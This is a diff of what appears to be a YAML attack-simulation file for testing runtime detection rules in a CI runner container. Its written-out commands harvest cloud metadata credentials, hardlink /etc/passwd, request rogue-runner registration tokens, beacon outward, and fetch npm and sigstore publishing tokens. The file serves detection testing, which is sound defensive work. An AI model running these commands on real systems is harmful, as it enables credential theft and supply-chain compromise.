@@ -234,7 +234,7 @@ attacks:
   - name: cred-cloud-imds-harvest
     type: ssrf
     exec:
-      command: ["sh", "-c", "curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token; curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
+      command: ["sh", "-c", "(command -v curl >/dev/null && curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token || wget -q -T3 -O- --header='Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token) 2>&1 | head -2"]
     expectedDetections:
       - attackType: ssrf
         ruleID: R0011
@@ -345,7 +345,7 @@ attacks:
   - name: cache-unauthenticated-server-probe
     type: ssrf
     exec:
-      command: ["sh", "-c", "for p in 8080 34567 42000; do curl -s -m 2 -o /dev/null -w \"$p:%{http_code}\\n\" http://127.0.0.1:$p/_apis/artifactcache/cache 2>/dev/null; done"]
+      command: ["sh", "-c", "for p in 8080 34567 42000; do (command -v curl >/dev/null && curl -s -m 2 -o /dev/null -w \"$p:%{http_code}\\n\" http://127.0.0.1:$p/_apis/artifactcache/cache || wget -q -T2 -O- http://127.0.0.1:$p/_apis/artifactcache/cache >/dev/null 2>&1 && echo \"$p:up\") 2>/dev/null; done"]
     expectedDetections:
       - attackType: ssrf
         ruleID: R0001
@@ -580,11 +580,14 @@ attacks:
         ruleName: Files Access Anomalies in container
         containerName: runner
 
-  # T1222 — hardlink variant, which bypasses symlink-aware checks
+  # T1222 — hardlink variant, which bypasses symlink-aware checks.
+  # The target MUST be on the same device as the link: /etc/passwd lives on the
+  # container layer and /_work is an emptyDir, so linking across them fails with
+  # "Cross-device link" and R1012 can never fire. Measured, not assumed.
   - name: escape-hardlink-sensitive-path
     type: custom
     exec:
-      command: ["sh", "-c", "ln /etc/passwd /_work/.passwd-hard 2>/dev/null; ls -l /_work/.passwd-hard 2>/dev/null"]
+      command: ["sh", "-c", "cp /etc/passwd /_work/.seed 2>/dev/null; ln /_work/.seed /_work/.passwd-hard 2>&1; ln /etc/passwd /tmp/.passwd-hard 2>&1; ls -l /_work/.passwd-hard /tmp/.passwd-hard 2>&1 | head -2"]
     expectedDetections:
       - attackType: custom
         ruleID: R1012
@@ -683,7 +686,7 @@ attacks:
   - name: persist-register-rogue-runner
     type: custom
     exec:
-      command: ["sh", "-c", "curl -s -m 3 -X POST -H 'Authorization: Bearer REDACTED' https://api.github.com/enterprises/cncf/actions/runners/registration-token 2>&1 | head -3"]
+      command: ["sh", "-c", "${FETCH:-curl} -s -m 3 -X POST -H 'Authorization: Bearer REDACTED' https://api.github.com/enterprises/cncf/actions/runners/registration-token 2>&1 | head -3"]
     expectedDetections:
       - attackType: custom
         ruleID: R0011
@@ -730,7 +733,7 @@ attacks:
   - name: c2-beacon-over-https
     type: custom
     exec:
-      command: ["sh", "-c", "curl -s -m 3 -o /dev/null -w '%{http_code}' https://api.github.com/zen 2>&1; curl -s -m 3 -o /dev/null https://pipedream.net/ 2>&1"]
+      command: ["sh", "-c", "(command -v curl >/dev/null && curl -s -m 3 -o /dev/null -w '%{http_code}' https://api.github.com/zen || wget -q -T3 -O- https://api.github.com/zen) 2>&1 | head -c 60"]
     expectedDetections:
       - attackType: custom
         ruleID: R0011
@@ -788,7 +791,7 @@ attacks:
   - name: publish-oidc-token-exchange
     type: custom
     exec:
-      command: ["sh", "-c", "curl -s -m 3 -X POST -H 'Authorization: Bearer REDACTED' https://registry.npmjs.org/-/npm/v1/oidc/token/exchange 2>&1 | head -3"]
+      command: ["sh", "-c", "${FETCH:-curl} -s -m 3 -X POST -H 'Authorization: Bearer REDACTED' https://registry.npmjs.org/-/npm/v1/oidc/token/exchange 2>&1 | head -3"]
     expectedDetections:
       - attackType: custom
         ruleID: R0011
@@ -805,7 +808,7 @@ attacks:
   - name: publish-sigstore-fulcio-certificate
     type: custom
     exec:
-      command: ["sh", "-c", "curl -s -m 3 -X POST -H 'Authorization: Bearer REDACTED' https://fulcio.sigstore.dev/api/v2/signingCert 2>&1 | head -3"]
+      command: ["sh", "-c", "${FETCH:-curl} -s -m 3 -X POST -H 'Authorization: Bearer REDACTED' https://fulcio.sigstore.dev/api/v2/signingCert 2>&1 | head -3"]
     expectedDetections:
       - attackType: custom
         ruleID: R0011
